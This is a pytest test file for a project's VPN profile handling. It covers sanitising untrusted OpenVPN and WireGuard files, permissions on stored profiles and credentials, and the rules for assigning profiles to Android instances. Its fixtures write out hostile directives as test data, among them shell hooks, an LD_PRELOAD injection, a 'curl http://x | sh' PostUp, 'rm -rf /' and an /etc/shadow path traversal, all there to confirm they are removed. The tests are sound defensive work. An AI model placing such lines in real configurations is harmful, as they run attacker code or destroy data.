"""VPN profiles: sanitising untrusted files, the profile folder, credentials, profile choice."""
import random
import shutil
import stat
import subprocess
from collections import Counter

import pytest
from net_fakes import KEY, OVPN, PEM, WG, WG_PRIVATE, WG_PUBLIC

from superfarm.net import vpn
from superfarm.net.vpn import Remote, choose_profile, sanitise_openvpn, sanitise_wireguard
from superfarm.paths import REPO_DIR

ENTRYPOINT = REPO_DIR / "deploy" / "docker" / "net" / "entrypoint.sh"

HOSTILE = OVPN + """
script-security 3
up /tmp/x.sh
down "/bin/sh -c 'id > /tmp/pwned'"
route-up /etc/openvpn/hook
route-pre-down /bin/true
ipchange /bin/true
tls-verify /bin/true
plugin /usr/lib/openvpn/plugin.so
management 127.0.0.1 7505
management-client
setenv LD_PRELOAD /tmp/evil.so
setenv PATH /tmp
iproute /tmp/ip
config /etc/passwd
log /etc/cron.d/x
status /tmp/status
writepid /tmp/pid
daemon
user nobody
group nogroup
chroot /tmp
cd /tmp
tmp-dir /dev/shm
some-future-directive yes
"""


def body(text: str) -> str:
    """A sanitised profile without its first line (the header names what was removed)."""
    return text.split("\n", 1)[1]


# ------------------------------------------------------------------ OpenVPN sanitising

def test_everything_that_can_run_or_write_is_removed():
    p = sanitise_openvpn(HOSTILE)
    kept = {ln.split()[0] for ln in p.text.splitlines() if ln and not ln.startswith(("#", "<", "-", "M"))}
    for bad in ("script-security", "up", "down", "route-up", "route-pre-down", "ipchange", "tls-verify", "plugin",
                "management", "management-client", "setenv", "iproute", "config", "log", "status", "writepid",
                "daemon", "user", "group", "chroot", "cd", "tmp-dir", "some-future-directive"):
        assert bad not in kept, bad
        assert bad in p.removed
    assert "/tmp" not in p.text and "LD_PRELOAD" not in p.text
    # what makes the tunnel work is still there
    assert {"client", "remote", "cipher", "persist-tun", "remote-cert-tls", "auth-user-pass"} <= kept
    assert p.text.count("<ca>") == 1 and PEM in p.text and KEY in p.text
    assert p.text.startswith(vpn.HEADER + ": removed ")


def test_unknown_directives_are_dropped_not_trusted():
    p = sanitise_openvpn("client\nremote a.example.net 1194\nbrand-new-option /bin/sh\n")
    assert p.removed == ["brand-new-option"] and "brand-new-option" not in body(p.text)


def test_sanitising_is_idempotent():
    once = sanitise_openvpn(HOSTILE).text
    again = sanitise_openvpn(once)
    assert again.text == once.replace(once.splitlines()[0], vpn.HEADER, 1)
    assert again.removed == []
    assert sanitise_openvpn(again.text).text == again.text


def test_double_dash_and_crlf_and_bom_are_understood():
    p = sanitise_openvpn(b"\xef\xbb\xbfclient\r\n--remote a.example.net 1194\r\n--up /x\r\n")
    assert p.remotes == [Remote("a.example.net", 1194, "udp")] and p.removed == ["up"]
    assert "\r" not in p.text


def test_remotes_with_defaults_ports_and_transports():
    p = sanitise_openvpn("client\nproto tcp-client\nport 443\nremote a.example.net\nremote 198.51.100.7 1195 udp\n")
    assert p.remotes == [Remote("a.example.net", 443, "tcp"), Remote("198.51.100.7", 1195, "udp")]
    assert sanitise_openvpn("remote a.example.net\n").remotes == [Remote("a.example.net", 1194, "udp")]
    assert str(p.remotes[0]) == "a.example.net:443/tcp"


def test_connection_blocks_are_filtered_like_the_top_level():
    text = "client\n<connection>\nremote b.example.net 8443\nproto udp\nup /x\n</connection>\n<connection>\nremote c.example.net 443 tcp\n</connection>\n"
    p = sanitise_openvpn(text)
    assert Remote("b.example.net", 8443, "udp") in p.remotes and Remote("c.example.net", 443, "tcp") in p.remotes
    assert "up" in p.removed and "up /x" not in p.text
    assert p.text.count("<connection>") == 2


def test_external_files_are_refused_with_the_fix_in_the_message():
    with pytest.raises(ValueError, match=r"<ca> and </ca>"):
        sanitise_openvpn("client\nremote a.example.net 1194\nca /etc/openvpn/ca.crt\n")
    with pytest.raises(ValueError, match="separate file"):
        sanitise_openvpn("client\nremote a.example.net 1194\ntls-auth ta.key 1\n")


def test_sibling_files_are_embedded_when_a_reader_is_given():
    files = {"ca.crt": PEM, "ta.key": "-----BEGIN OpenVPN Static key V1-----\nabcd\n-----END OpenVPN Static key V1-----\n"}
    p = sanitise_openvpn("client\nremote a.example.net 1194\nca ca.crt\ntls-auth ta.key 1\n", read_file=files.get)
    assert f"<ca>\n{PEM}\n</ca>" in p.text
    assert "key-direction 1\n<tls-auth>" in p.text and "ta.key" not in p.text
    # a path is never handed to the reader, only a plain file name
    seen = []
    with pytest.raises(ValueError):
        sanitise_openvpn("remote a.example.net\nca ../../etc/shadow\n", read_file=lambda n: seen.append(n))
    assert seen == []


def test_credentials_file_path_is_replaced_by_the_farm_store():
    p = sanitise_openvpn("client\nremote a.example.net 1194\nauth-user-pass /srv/someone/pass.txt\n")
    assert "auth-user-pass\n" in p.text and "pass.txt" not in p.text and p.needs_credentials
    inline = sanitise_openvpn("client\nremote a.example.net 1194\n<auth-user-pass>\nuser\npw\n</auth-user-pass>\n")
    assert not inline.needs_credentials
    assert not sanitise_openvpn("client\nremote a.example.net 1194\n").needs_credentials


def test_interactive_retry_is_removed():
    p = sanitise_openvpn("remote a.example.net\nauth-retry interact\n")
    assert "auth-retry" not in body(p.text) and p.removed == ["auth-retry interact"]
    assert "auth-retry nointeract" in sanitise_openvpn("remote a.example.net\nauth-retry nointeract\n").text


def test_device_name_is_normalised_so_the_firewall_matches_it():
    assert "dev tun\n" in sanitise_openvpn("dev tun7\nremote a.example.net\n").text
    assert "dev tun\n" in sanitise_openvpn("dev tunnel-out\nremote a.example.net\n").text
    with pytest.raises(ValueError, match="tun"):
        sanitise_openvpn("dev tap0\nremote a.example.net\n")


@pytest.mark.parametrize("text, message", [
    ("client\nverb 3\n", "names no server"),
    ("remote 2001:db8::1 1194\n", "IPv6"),
    ("remote [2001:db8::1] 1194\n", "IPv6"),
    ("remote bad_host! 1194\n", "not a valid server"),
    ("remote a.example.net 99999\n", "port"),
    ("remote a.example.net 1194 udp6\n", "transport"),
    ("proto sctp\nremote a.example.net\n", "transport"),
    ("remote a.example.net\nhttp-proxy 10.0.0.1 3128\n", "proxy"),
    ("remote a.example.net\nsocks-proxy 10.0.0.1 1080\n", "proxy"),
    ("remote a.example.net\n<ca>\nabc\n", "never closed"),
    ("remote a.example.net\n<connection>\n<ca>\n</ca>\n</connection>\n", "nested"),
    ("remote a.example.net\n<weird stuff\n", "unexpected"),
    ("remote a.example.net\x00\n", "NUL"),
])
def test_profiles_that_cannot_be_made_safe_are_rejected(text, message):
    with pytest.raises(ValueError, match=message):
        sanitise_openvpn(text)


def test_binary_and_oversized_uploads_are_rejected():
    with pytest.raises(ValueError, match="text file"):
        sanitise_openvpn(b"\xff\xfe\x00remote")
    with pytest.raises(ValueError, match="larger"):
        sanitise_openvpn(b"#" * (vpn.MAX_PROFILE_BYTES + 1))


def test_unknown_inline_blocks_are_dropped():
    p = sanitise_openvpn("remote a.example.net\n<script>\n#!/bin/sh\nid\n</script>\n")
    assert "<script>" in p.removed and "#!/bin/sh" not in p.text


@pytest.mark.skipif(shutil.which("awk") is None, reason="needs awk")
@pytest.mark.parametrize("text", [
    OVPN,
    "client\nproto tcp-client\nport 443\nremote a.example.net\nremote 198.51.100.7 1195 udp\n",
    "client\n<connection>\nremote b.example.net 8443\nproto udp\n</connection>\n<connection>\nremote c.example.net 443 tcp\n</connection>\n",
    "remote a.example.net\n; remote commented.example.net 1\n# remote also.example.net 2\n",
    "rport 4000\nremote a.example.net\r\nremote b.example.net 53 udp4\r\n",
])
def test_the_sidecar_pins_exactly_the_servers_this_module_reports(tmp_path, text):
    """Two parsers read a profile: this module (for display) and the sidecar's entrypoint
    (for the firewall pins). They must never disagree."""
    profile = sanitise_openvpn(text)
    f = tmp_path / "p.ovpn"
    f.write_text(profile.text)
    out = subprocess.run(["sh", str(ENTRYPOINT), "list-remotes", "openvpn", str(f)], capture_output=True, text=True, timeout=20)
    assert out.returncode == 0, out.stderr
    from_shell = {tuple(line.split()) for line in out.stdout.splitlines()}
    assert from_shell == {(r.proto, r.host, str(r.port)) for r in profile.remotes}


# ------------------------------------------------------------------ WireGuard sanitising

def test_wireguard_commands_are_removed():
    hostile = WG.replace("MTU = 1380", "MTU = 1380\nPostUp = iptables -F; curl http://x | sh\nPreDown = rm -rf /\n"
                                         "Table = off\nSaveConfig = true\nFwMark = 0x1")
    p = sanitise_wireguard(hostile)
    assert p.removed == ["FwMark", "PostUp", "PreDown", "SaveConfig", "Table"]
    assert "curl" not in p.text and "rm -rf" not in p.text
    assert p.remotes == [Remote("wg.example.net", 51820, "udp")]
    assert f"PrivateKey = {WG_PRIVATE}" in p.text and f"PublicKey = {WG_PUBLIC}" in p.text
    assert sanitise_wireguard(p.text).text == p.text.replace(p.text.splitlines()[0], vpn.HEADER, 1)


@pytest.mark.parametrize("change, message", [
    (("PrivateKey = " + WG_PRIVATE, "PrivateKey = short"), "not a WireGuard key"),
    (("Endpoint = wg.example.net:51820", "Endpoint = wg.example.net"), "Endpoint must be"),
    (("Endpoint = wg.example.net:51820", "Endpoint = [2001:db8::1]:51820"), "IPv6"),
    (("Endpoint = wg.example.net:51820\n", ""), "Endpoint"),
    (("Address = 10.66.0.2/32\n", ""), "PrivateKey and Address"),
    (("Address = 10.66.0.2/32", "Address = not-an-ip"), "not an address"),
    (("[Peer]", "[Hook]"), "unknown section"),
    (("MTU = 1380", "MTU = big"), "number"),
])
def test_wireguard_profiles_are_validated(change, message):
    with pytest.raises(ValueError, match=message):
        sanitise_wireguard(WG.replace(*change))


@pytest.mark.skipif(shutil.which("awk") is None, reason="needs awk")
def test_the_sidecar_reads_the_same_wireguard_endpoint(tmp_path):
    profile = sanitise_wireguard(WG)
    f = tmp_path / "p.conf"
    f.write_text(profile.text)
    out = subprocess.run(["sh", str(ENTRYPOINT), "list-remotes", "wireguard", str(f)], capture_output=True, text=True, timeout=20)
    assert out.stdout.split() == ["udp", "wg.example.net", "51820"]


# ------------------------------------------------------------------ the profile folder

def test_import_stores_a_sanitised_owner_only_file(farm_home):
    name = vpn.import_profile(farm_home, "../../My Server (1).OVPN", HOSTILE.encode())
    assert name == "My_Server_1_.ovpn"
    stored = farm_home.vpn / name
    assert stat.S_IMODE(stored.stat().st_mode) == 0o600
    assert "script-security" not in body(stored.read_text()) and stored.read_text().startswith(vpn.HEADER)
    assert vpn.profile_names(farm_home) == [name] and vpn.profile_names(farm_home, "wireguard") == []


def test_import_refuses_other_file_types_and_bad_content(farm_home):
    with pytest.raises(ValueError, match="OpenVPN file"):
        vpn.import_profile(farm_home, "notes.txt", OVPN.encode())
    with pytest.raises(ValueError, match="names no server"):
        vpn.import_profile(farm_home, "empty.ovpn", b"client\n")
    with pytest.raises(ValueError, match="file name"):
        vpn.import_profile(farm_home, "...", OVPN.encode())
    assert vpn.profile_names(farm_home) == []


def test_a_hand_copied_profile_is_sanitised_when_it_is_used(farm_home):
    (farm_home.vpn / "manual.ovpn").write_text("client\nremote a.example.net 1194\nca ca.crt\nup /bin/evil\n")
    (farm_home.vpn / "ca.crt").write_text(PEM + "\n")
    p = vpn.load_profile(farm_home, "manual.ovpn")
    assert p.removed == ["up"] and f"<ca>\n{PEM}\n</ca>" in p.text
    dest = farm_home.instance(3) / "net" / "profile.ovpn"
    vpn.write_runtime_copy(farm_home, "manual.ovpn", dest)
    assert "up /bin/evil" not in dest.read_text() and stat.S_IMODE(dest.stat().st_mode) == 0o600
    before = dest.stat().st_ino
    vpn.write_runtime_copy(farm_home, "manual.ovpn", dest)
    assert dest.stat().st_ino == before, "an unchanged copy must not be replaced: the file is bind-mounted"


def test_profile_names_cannot_escape_the_folder(farm_home):
    for bad in ("../x.ovpn", "a/b.ovpn", ".hidden.ovpn", "", "x.txt"):
        with pytest.raises(ValueError):
            vpn.load_profile(farm_home, bad)
    with pytest.raises(KeyError):
        vpn.load_profile(farm_home, "missing.ovpn")
    with pytest.raises(KeyError):
        vpn.delete_profile(farm_home, "missing.ovpn")


def test_listing_shows_servers_and_problems_but_never_keys(farm_home):
    vpn.import_profile(farm_home, "good.ovpn", OVPN.encode())
    vpn.import_profile(farm_home, "wg.conf", WG.encode())
    (farm_home.vpn / "broken.ovpn").write_text("client\nremote a.example.net\nca /abs/ca.crt\n")
    (farm_home.vpn / "readme.txt").write_text("not a profile")
    rows = {r["name"]: r for r in vpn.list_profiles(farm_home)}
    assert set(rows) == {"good.ovpn", "wg.conf", "broken.ovpn"}
    assert rows["good.ovpn"]["servers"] == ["vpn1.example.net:1194/udp", "198.51.100.20:443/tcp"]
    assert rows["good.ovpn"]["needs_credentials"] and rows["good.ovpn"]["provider"] == "openvpn"
    assert rows["wg.conf"]["provider"] == "wireguard" and rows["wg.conf"]["servers"] == ["wg.example.net:51820/udp"]
    assert not rows["broken.ovpn"]["valid"] and "separate file" in rows["broken.ovpn"]["error"]
    assert WG_PRIVATE not in repr(rows) and "BEGIN" not in repr(rows)
    vpn.delete_profile(farm_home, "good.ovpn")
    assert "good.ovpn" not in vpn.profile_names(farm_home)


# ------------------------------------------------------------------ credentials

def test_credentials_are_owner_only_and_write_only(farm_home):
    assert not vpn.has_credentials(farm_home, "default")
    vpn.set_credentials(farm_home, "default", "user@example", "p4ss word")
    f = vpn.credentials_path(farm_home, "default")
    assert f.parent == farm_home.secrets and f.read_text() == "user@example\np4ss word\n"
    assert stat.S_IMODE(f.stat().st_mode) == 0o600 and stat.S_IMODE(f.parent.stat().st_mode) == 0o700
    assert vpn.has_credentials(farm_home, "default")
    assert not [n for n in dir(vpn) if n.startswith(("get_cred", "read_cred", "load_cred"))]
    assert vpn.delete_credentials(farm_home, "default") and not vpn.delete_credentials(farm_home, "default")


@pytest.mark.parametrize("name, user, password", [
    ("default", "", "x"), ("default", "u", ""), ("default", "u\nroot", "x"), ("default", "u", "x\r\ny"),
    ("../etc", "u", "x"), ("a/b", "u", "x"), ("", "u", "x"),
])
def test_bad_credentials_are_refused(farm_home, name, user, password):
    with pytest.raises(ValueError):
        vpn.set_credentials(farm_home, name, user, password)
    assert not list(farm_home.secrets.glob("*"))


# ------------------------------------------------------------------ choosing a profile

NAMES = ["a.ovpn", "b.ovpn", "c.ovpn"]


def test_fixed_uses_the_configured_profile_or_explains():
    assert choose_profile("fixed", NAMES, fixed="b.ovpn", current="a.ovpn") == "b.ovpn"
    with pytest.raises(ValueError, match="network.vpn.profile is empty"):
        choose_profile("fixed", NAMES)
    with pytest.raises(ValueError, match="not among"):
        choose_profile("fixed", NAMES, fixed="z.ovpn")


def test_no_profiles_is_a_clear_error():
    with pytest.raises(ValueError, match="sf vpn import"):
        choose_profile("round-robin", [])


def test_round_robin_deals_profiles_out_evenly_and_in_order():
    assigned: dict[int, str] = {}
    for i in range(1, 8):
        assigned[i] = choose_profile("round-robin", NAMES, assigned={k: v for k, v in assigned.items() if k != i})
    assert [assigned[i] for i in range(1, 8)] == ["a.ovpn", "b.ovpn", "c.ovpn", "a.ovpn", "b.ovpn", "c.ovpn", "a.ovpn"]
    # a deleted Android's profile is the next one handed out
    del assigned[2]
    assert choose_profile("round-robin", NAMES, assigned=assigned) == "b.ovpn"


@pytest.mark.parametrize("selection", ["random", "round-robin"])
def test_the_choice_is_sticky_until_the_profile_disappears(selection):
    assert choose_profile(selection, NAMES, current="c.ovpn", assigned={2: "c.ovpn", 3: "c.ovpn"}) == "c.ovpn"
    assert choose_profile(selection, ["a.ovpn", "b.ovpn"], current="c.ovpn", rng=random.Random(1)) in ("a.ovpn", "b.ovpn")


def test_random_uses_the_given_generator_and_spreads():
    rng = random.Random(7)
    picks = Counter(choose_profile("random", NAMES, rng=rng) for _ in range(300))
    assert set(picks) == set(NAMES) and min(picks.values()) > 60
    assert choose_profile("random", NAMES, rng=random.Random(7)) == choose_profile("random", NAMES, rng=random.Random(7))


def test_unique_never_shares_a_profile_between_running_androids():
    assert choose_profile("unique", NAMES, in_use={"a.ovpn"}) == "b.ovpn"
    # prefers a profile nobody has claimed, so a stopped Android finds its own one free later
    assert choose_profile("unique", NAMES, assigned={5: "a.ovpn"}, in_use=set()) == "b.ovpn"
    assert choose_profile("unique", NAMES, assigned={5: "a.ovpn", 6: "b.ovpn", 7: "c.ovpn"}, in_use={"b.ovpn", "c.ovpn"}) == "a.ovpn"
    # keeps its own while it is free, moves when someone else is running on it
    assert choose_profile("unique", NAMES, current="c.ovpn", in_use={"a.ovpn"}) == "c.ovpn"
    assert choose_profile("unique", NAMES, current="c.ovpn", in_use={"c.ovpn"}) == "a.ovpn"
    with pytest.raises(ValueError, match="all 3 VPN profiles are in use"):
        choose_profile("unique", NAMES, in_use=set(NAMES))


def test_unknown_selection_is_rejected():
    with pytest.raises(ValueError, match="unknown"):
        choose_profile("fastest", NAMES)


def test_reservations_cover_starts_that_have_no_container_yet():
    r = vpn.Reservations(ttl=100)
    r.hold(1, "a.ovpn", now=0)
    r.hold(2, "b.ovpn", now=50)
    assert r.held_by_others(3, now=60) == {"a.ovpn", "b.ovpn"}
    assert r.held_by_others(1, now=60) == {"b.ovpn"}
    assert r.held_by_others(3, now=120) == {"b.ovpn"}       # the first one expired
    assert r.held_by_others(3, now=500) == set()
